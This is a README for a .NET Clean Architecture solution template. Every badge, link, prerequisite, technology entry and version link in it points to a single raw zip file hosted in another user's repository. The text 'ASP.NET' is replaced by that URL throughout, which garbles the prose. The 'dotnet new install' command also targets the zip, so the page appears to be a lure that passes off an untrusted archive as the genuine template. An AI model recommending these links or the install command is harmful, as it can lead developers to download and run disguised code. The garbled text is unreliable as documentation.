# Clean Architecture Solution Template

[![Build](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
[![CodeQL](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
[![Nuget](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
[![Nuget](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
![Twitter Follow](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)

The goal of this template is to provide a straightforward and efficient approach to enterprise application development, leveraging the power of Clean Architecture and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core. Using this template, you can effortlessly create a Single Page App (SPA) with https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core and Angular or React, while adhering to the principles of Clean Architecture. Getting started is easy - simply install the **.NET template** (see below for full details).

If you find this project useful, please give it a star. Thanks! ⭐

## Getting Started

The following prerequisites are required to build and run the solution:

- [.NET 8.0 SDK](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) (latest version)
- [https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) (latest LTS, only required if you are using Angular or React)

The easiest way to get started is to install the [.NET template](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip):
```
dotnet new install https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip
```

Once installed, create a new solution using the template. You can choose to use Angular, React, or create a Web API-only solution. Specify the client framework using the `-cf` or `--client-framework` option, and provide the output directory where your project will be created. Here are some examples:

To create a Single-Page Application (SPA) with Angular and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core:
```bash
dotnet new ca-sln --client-framework Angular --output YourProjectName
```

To create a SPA with React and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core:
```bash
dotnet new ca-sln -cf React -o YourProjectName
```

To create a https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core Web API-only solution:
```bash
dotnet new ca-sln -cf None -o YourProjectName
```

Launch the app:
```bash
cd src/Web
dotnet run
```

To learn more, run the following command:
```bash
dotnet new ca-sln --help
```

You can create use cases (commands or queries) by navigating to `./src/Application` and running `dotnet new ca-usecase`. Here are some examples:

To create a new command:
```bash
dotnet new ca-usecase --name CreateTodoList --feature-name TodoLists --usecase-type command --return-type int
```

To create a query:
```bash
dotnet new ca-usecase -n GetTodos -fn TodoLists -ut query -rt TodosVm
```

To learn more, run the following command:
```bash
dotnet new ca-usecase --help
```

## Database

The template is configured to use SQL Server by default. If you would prefer to use SQLite, create your solution using the following command:

```bash
dotnet new ca-sln --use-sqlite
```

When you run the application the database will be automatically created (if necessary) and the latest migrations will be applied.

Running database migrations is easy. Ensure you add the following flags to your command (values assume you are executing from repository root)

* `--project src/Infrastructure` (optional if in this folder)
* `--startup-project src/Web`
* `--output-dir Data/Migrations`

For example, to add a new migration from the root folder:

 `dotnet ef migrations add "SampleMigration" --project src\Infrastructure --startup-project src\Web --output-dir Data\Migrations`

## Deploy

The template includes a full CI/CD pipeline. The pipeline is responsible for building, testing, publishing and deploying the solution to Azure. If you would like to learn more, read the [deployment instructions](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip).

## Technologies

* [https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core 8](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [Entity Framework Core 8](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [Angular 15](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) or [React 18](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [MediatR](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [AutoMapper](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [FluentValidation](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [NUnit](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip), [FluentAssertions](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip), [Moq](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) & [Respawn](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)

## Versions
The main branch is now on .NET 8.0. The following previous versions are available:

* [7.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [6.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [5.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [3.1](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)

## Learn More

* [Clean Architecture with https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core 3.0 (GOTO 2019)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
* [Clean Architecture with .NET Core: Getting Started](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)

## Support

If you are having problems, please let me know by [raising a new issue](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip).

## License

This project is licensed with the [MIT license](LICENSE).
